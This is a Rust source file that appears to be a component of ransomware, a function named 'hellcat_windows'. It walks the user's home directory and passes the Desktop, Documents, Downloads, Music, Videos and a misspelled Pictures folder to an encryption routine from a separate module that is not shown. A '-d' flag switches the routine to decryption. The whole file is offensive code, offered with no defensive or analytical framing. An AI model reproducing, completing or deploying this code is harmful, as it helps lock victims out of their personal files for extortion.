use dirs;

// import encyrption module in ./encryption/enc.rs
use crate::encryption::enc::{self};

pub async fn hellcat_windows() {
    
    // get the home directory
    let home = dirs::home_dir().unwrap();
    let home_str = home.to_str().unwrap();

    println!("Home {}", home_str);

    // get the args
    let mut decrypt:bool = false;

    // check if argument is present
    for argument in std::env::args() {
        if argument == "-d" {
            decrypt = true;
        }
    }

    // array of home dir with: Desktop, Documents, Downloads, Music, Puctures, Videos
    let intresting_folder = [
        "Desktop",
        "Documents",
        "Downloads",
        "Music",
        "Puctures",
        "Videos"
    ];

    for f in intresting_folder {
        // start encryption
        let full_path = home_str.to_string() + "\\" + f;
        enc::encryption(full_path.as_str(), decrypt);
    }
        


}